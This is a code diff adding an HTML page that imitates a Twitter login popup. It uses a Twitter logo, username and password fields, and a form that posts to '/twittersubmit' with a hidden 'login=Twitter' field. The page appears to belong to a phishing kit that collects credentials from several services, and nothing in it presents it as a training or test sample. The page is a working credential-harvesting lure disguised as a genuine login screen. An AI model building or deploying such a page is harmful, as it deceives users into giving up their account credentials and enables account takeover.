@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<link rel="stylesheet" href="/css/twitter.css">
+<link rel="stylesheet" href="/css/style copy.css">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+
+<body>
+    <div class="popup-login login-twitter animated fadeIn" style="padding: 50px;">
+        <div class="popup-box-login-twitter">
+        <div class="box-twitter">
+        <div class="header-twitter"><img src="https://i.postimg.cc/dtyfWFF2/login-Method2.png" width="50px" height="auto"></div> <!--- header-twitter --->
+        <br>
+        <br>
+        <br>
+        <center>
+        <form action="/twittersubmit" method="post">
+        <div class="txt-login-twitter">Login to Twitter</div>
+        <div class="input-box-twitter">
+        <label>Phone, email, or username</label>
+        <input type="text" name="email" placeholder="" required>
+        </div>
+        <div class="input-box-twitter">
+        <div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
+        <div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div>
+        <label>Password</label>
+        <input type="password" style="width: 85%;" name="password" id="twitterPassword" placeholder="" required>
+        </div>
+        <input type="hidden" name="login" value="Twitter" readonly>
+        <button type="submit" class="btn-login-twitter">Log In</button>
+        <div class="footer-menu-twitter">Forgot password?</div>
+        <div class="footer-menu-twitter bulet">•</div>
+        <div class="footer-menu-twitter">Sign up to Twitter</div>
+        </form>
+        </center>
+</div> <!--- box-twitter --->
+</div> <!--- popup-box-login-twitter --->
+</div> <!--- popup-login --->
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="/js/script.js"></script>
+<script src="/js/showHide.js"></script>
+</body>
+</html>
